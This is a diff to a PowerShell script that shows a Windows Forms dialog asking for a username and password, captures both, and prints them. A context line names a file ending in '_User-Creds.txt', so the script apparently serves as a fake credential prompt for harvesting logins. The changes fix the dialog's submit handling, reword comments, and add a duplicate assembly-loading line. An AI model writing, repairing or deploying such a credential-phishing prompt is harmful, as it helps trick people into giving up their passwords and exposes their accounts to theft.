@@ -45,6 +45,8 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 Add-Type -AssemblyName System.Windows.Forms
 
+Add-Type -AssemblyName System.Windows.Forms
+
 function Get-Creds {
     while ($true) {
         # Create the form and the controls for username and password input
@@ -78,15 +80,16 @@ function Get-Creds {
         $btnSubmit.Location = New-Object System.Drawing.Point(80, 100)
         $form.Controls.Add($btnSubmit)
 
-        # When the Submit button is clicked, return the values
+        # When the Submit button is clicked, close the form
         $btnSubmit.Add_Click({
+            $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
             $form.Close()
         })
 
-        # Show the form
+        # Show the form and wait for the user interaction
         $form.ShowDialog()
 
-        # Get the username and password from the form
+        # After the form closes, get the username and password
         $userName = $textUser.Text
         $password = $textPass.Text
 
@@ -108,10 +111,11 @@ function Get-Creds {
     }
 }
 
-# Example of using the function
+# Example usage of the function
 $creds = Get-Creds
 Write-Host "Username: $($creds.UserName)"
 Write-Host "Password: $($creds.Password)"
+
 
 
 
